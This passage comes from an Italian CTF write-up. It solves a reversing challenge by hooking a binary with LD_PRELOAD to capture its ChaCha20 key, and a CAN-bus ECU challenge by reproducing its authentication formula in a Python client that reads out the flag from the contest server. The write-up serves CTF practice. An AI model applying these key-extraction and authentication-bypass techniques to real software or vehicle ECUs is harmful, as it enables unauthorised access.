</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--key&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;extracted/e/f1&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;path to e/f1 (la chiave AES grezza da 32 byte)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--blob&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;extracted/e/f2&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;path to e/f2 (blob base64 IV+ciphertext)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s2">&#34;--out&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">default</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s2">&#34;uwu/flag.txt&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">      <span class="nb">type</span><span class="o">=</span><span class="n">Path</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">help</span><span class="o">=</span><span class="s2">&#34;percorso di output per la flag recuperata (default: uwu/flag.txt)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">key</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">blob</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">blob</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">   <span class="n">iv</span><span class="p">,</span> <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">blob</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span> <span class="n">blob</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">   <span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">plaintext</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">aes</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">args</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">parent</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">parents</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="n">args</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">write_bytes</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag scritta in </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">out</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="ironveil">IronVeil<a hidden class="anchor" aria-hidden="true" href="#ironveil">#</a></h3>
<h4 id="analisi-17">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-17">#</a></h4>
<p>Abbiamo ricevuto un binario ELF64 ‚Äústripped‚Äù (<code>ironveil</code>) e un blob cifrato (<code>flag.txt.encrypted</code>). Eseguire il binario cifra un file nominato ed emette un contenitore <code>IRONVEIL_ENC_V3</code>:</p>
<ul>
<li><code>00..0f</code>: <code>&quot;IRONVEIL_ENC_V3\0&quot;</code></li>
<li><code>10..1b</code>: nonce da 12 byte</li>
<li><code>1c..end-10</code>: ciphertext</li>
<li><code>ultimi 16</code>: tag Poly1305
(Lunghezza plaintext = dimensione totale ‚àí 44 byte.)</li>
</ul>
<p>La ricognizione statica (main a <code>0xfb60</code>) mostrava hardening pesante: controlli poll/stack, una VM per thread, e <code>ChaCha20-Poly1305</code>. Stringhe vicino a <code>0x59c8a</code> (&ldquo;Key derived using VM program with 101 opcodes&rdquo;) indicano che la chiave √® calcolata al volo. La pipeline √® guidata da <code>sub_9F20</code>, che alimenta un core AVX ChaCha (<code>sub_1B4A0</code>) usando la costante <code>&quot;expand 32-byte k&quot;</code> a <code>0x572c0</code>.</p>
<p>Idee ingenue fallite:</p>
<ul>
<li>Hash dell‚Äômtime del file (<code>Fri, 07 Nov 2025 23:35:40 GMT</code>) non riproduce la chiave; la VM mescola stato extra nascosto.</li>
<li>Hook <code>LD_PRELOAD</code> su memcpy/sniffer dumpano molta memoria ma il programma azzera i buffer prima di stampare.</li>
<li>Snapshot catturano solo zeri perch√© la chiave vive per lo pi√π nei registri.</li>
</ul>
<p>Osservazione chiave: subito prima di chiamare il blocco ChaCha, <code>sub_9F20</code> riversa brevemente la chiave da 32 byte sullo stack a <code>[rsp+0xa0]</code>. Quella finestra basta per rubarla.</p>
<h4 id="soluzione-14">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-14">#</a></h4>
<p>Abbiamo usato un helper <code>LD_PRELOAD</code> per patchare a caldo il binario e intercettare quello spill:</p>
<ol>
<li>Individuare la base PIE via <code>/proc/self/maps</code>.</li>
<li>Sovrascrivere l‚Äôistruzione a <code>PIE+0xd758</code> con <code>movabs rax,&lt;hook&gt;; call rax</code>, rimpiazzando temporaneamente l‚Äôoriginale <code>movl $0,0xc0(%rsp)</code>.</li>
<li>In una stub ‚Äúnaked‚Äù, copiare 32 byte da <code>[rsp+0xa0]</code> in un buffer globale, rigiocare l‚Äôistruzione spostata e <code>ret</code>.</li>
<li>Un hook leggero su <code>write()</code> stampa la chiave quando vede la riga &ldquo;Key derived using &hellip;&rdquo;.</li>
</ol>
<p>Eseguendo una cifratura qualunque con il preloader si ottiene:</p>
<pre tabindex="0"><code>[keyhook] base=0x559fe85f3000
[keyhook] derived key 7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95
File encrypted successfully: sample.txt.encrypted
Key derived using VM program with 101 opcodes
</code></pre><p>Con la chiave ChaCha a 32 byte in mano, la decrittazione √® diretta: parsare il formato, estrarre nonce/ciphertext/tag e usare <code>ChaCha20-Poly1305</code> con AAD vuoto.</p>
<h4 id="script-13">Script<a hidden class="anchor" aria-hidden="true" href="#script-13">#</a></h4>
<p>Compila ed esegui il preloader per esfiltrare la chiave:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ironveil_lab
</span></span><span class="line"><span class="cl">gcc -shared -fPIC keyhook.c -o keyhook.so -ldl
</span></span><span class="line"><span class="cl"><span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="nv">$PWD</span>/keyhook.so ./ironveil sample.txt
</span></span></code></pre></div><p>Decritta <code>flag.txt.encrypted</code> offline:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.ciphers.aead</span> <span class="kn">import</span> <span class="n">ChaCha20Poly1305</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;7442ff3d553fdd19a2d65ce1c0786e40ea23c668e1982b911d79d5e492d71e95&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">blob</span> <span class="o">=</span> <span class="n">Path</span><span class="p">(</span><span class="s2">&#34;flag.txt.encrypted&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read_bytes</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">nonce</span><span class="p">,</span> <span class="n">ct</span><span class="p">,</span> <span class="n">tag</span> <span class="o">=</span> <span class="n">blob</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">28</span><span class="p">],</span> <span class="n">blob</span><span class="p">[</span><span class="mi">28</span><span class="p">:</span><span class="o">-</span><span class="mi">16</span><span class="p">],</span> <span class="n">blob</span><span class="p">[</span><span class="o">-</span><span class="mi">16</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">ChaCha20Poly1305</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">nonce</span><span class="p">,</span> <span class="n">ct</span> <span class="o">+</span> <span class="n">tag</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></div><h2 id="hardware-">Hardware üîå<a hidden class="anchor" aria-hidden="true" href="#hardware-">#</a></h2>
<h3 id="arducan">Arducan<a hidden class="anchor" aria-hidden="true" href="#arducan">#</a></h3>
<h4 id="analisi-18">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-18">#</a></h4>
<p>Il firmware <code>sketch.elf</code> espone una ECU CAN testuale accessibile via TCP: accetta frame formattati come
<code>CAN_ID:LEN:BYTE0,BYTE1,...</code> ed implementa una piccola macchina a stati gated da un‚Äôautenticazione. Il flusso
ad alto livello √®: handshake diagnostico, richiesta di una challenge a 32 bit, calcolo e invio di una risposta
deterministica, invio di due comandi di stato identici per avanzare un latch interno, poi lettura della flag
in memoria a chunk.</p>
<p>ID e comportamenti chiave: 0x7E0 (handshake diagnostico), 0x600 (autenticazione), 0x700 (comandi di stato) e 0x7FF
(letture flag). Su richiesta di challenge (opcode interno 0x7C) il firmware ritorna 4 byte di challenge e un
contatore di sequenza (<code>seq</code>). La risposta richiesta √®:</p>
<p><code>resp = ((challenge ^ 0xDEADBEEF) * 0x1337 + seq) &amp; 0xffffffff</code></p>
<p>Inviala su CAN 0x600 con byte iniziale 0xC3 seguito dalla risposta a 4 byte big-endian. Dopo auth valida,
due frame <code>0x700:4:69,13,37,42</code> identici avanzano il latch. La flag si legge inviando frame <code>0x7FF</code> con
opcode <code>0xF1</code> e un offset; le risposte contengono fino a 6 byte ASCII per richiesta.</p>
<h4 id="soluzione-15">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-15">#</a></h4>
<p>Procedura compatta per recuperare la flag: connettersi via TCP e svuotare il banner; inviare <code>0x7E0:2:A5,A5</code>
per l‚Äôhandshake; richiedere la challenge con <code>0x600:2:3C,00</code>, parsare i 4 byte di challenge e il <code>seq</code> dalla
risposta, calcolare <code>resp</code> come sopra e inviarlo come <code>0x600:5:C3,RR,RR,RR,RR</code> (big-endian). Una volta confermato,
inviare <code>0x700:4:69,13,37,42</code> due volte (identici, consecutivi) per sbloccare le letture. Infine, iterare letture
<code>0x7FF:2:F1,offset</code> con offset += 6 e concatenare i chunk da 6 byte finch√© l‚Äôultimo √® pi√π corto.</p>
<p>One-liner essenziale: CONNECT &ndash;&gt; <code>0x7E0:2:A5,A5</code> &ndash;&gt; <code>0x600:2:3C,00</code> &ndash;&gt; parse(chal,seq) &ndash;&gt; <code>0x600:5:C3,resp_be</code> &ndash;&gt;
<code>0x700</code> x2 &ndash;&gt; ripetute <code>0x7FF:2:F1,offset</code>.</p>
<h4 id="script-14">Script<a hidden class="anchor" aria-hidden="true" href="#script-14">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">List</span><span class="p">,</span> <span class="n">Tuple</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s2">&#34;303ed4c6.ctf.ac.upt.ro&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">9730</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FRAME_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^([0-9A-Fa-f]+):(\d+):(.*)$&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_line</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">line</span> <span class="o">=</span> <span class="n">sock_file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ConnectionError</span><span class="p">(</span><span class="s2">&#34;Connection closed by remote host&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&lt;&lt; </span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">wait_for_frame</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">recv_line</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">FRAME_RE</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">can_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data_str</span> <span class="o">=</span> <span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">data_str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">part</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">data_str</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">part</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">can_id</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="n">can_id</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">int</span><span class="p">,</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">frame</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">can_id</span><span class="si">:</span><span class="s2">03X</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">frame</span> <span class="o">+=</span> <span class="s2">&#34;:&#34;</span> <span class="o">+</span> <span class="s2">&#34;,&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="s2">02X</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&gt;&gt; </span><span class="si">{</span><span class="n">frame</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">wait_for_frame</span><span class="p">(</span><span class="n">sock_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_auth_response</span><span class="p">(</span><span class="n">challenge</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">seq</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp</span> <span class="o">=</span> <span class="n">challenge</span> <span class="o">^</span> <span class="mh">0xDEADBEEF</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">*</span> <span class="mh">0x1337</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="n">result</span> <span class="o">+</span> <span class="p">(</span><span class="n">seq</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sock_file</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">makefile</span><span class="p">(</span><span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Drain the banner</span>
</span></span><span class="line"><span class="cl">        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">line</span> <span class="o">=</span> <span class="n">sock_file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="n">text</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="ow">not</span> <span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;&lt;&lt; </span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">,</span> <span class="ne">ConnectionError</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="cl">        <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 0: ECU diagnostic kick-off</span>
</span></span><span class="line"><span class="cl">        <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x7E0</span><span class="p">,</span> <span class="p">[</span><span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 1: request authentication challenge</span>
</span></span><span class="line"><span class="cl">        <span class="n">can_id</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">send_frame</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">sock_file</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">can_id</span> <span class="o">!=</span> <span class="mh">0x608</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">6</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x7C</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Unexpected authentication challenge response&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">challenge_bytes</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">seq_counter</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">challenge</span> <span class="o">=</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="o">|</span> <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="o">|</span> <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="o">|</span> <span class="p">(</span><span class="n">challenge_bytes</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Challenge: 0x</span><span class="si">{</span><span class="n">challenge</span><span class="si">:</span><span class="s2">08X</span><span class="si">}</span><span class="s2">, seq=</span><span class="si">{</span><span class="n">seq_counter</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Stage 2: send authentication response</span>
</span></span><span class="line"><span class="cl">        <span class="n">auth_value</span> <span class="o">=</span> <span class="n">compute_auth_response</span><span class="p">(</span><span class="n">challenge</span><span class="p">,</span> <span class="n">seq_counter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">auth_payload</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xC3</span><span class="p">]</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">auth_value</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;big&#34;</span><span class="p">))</span>
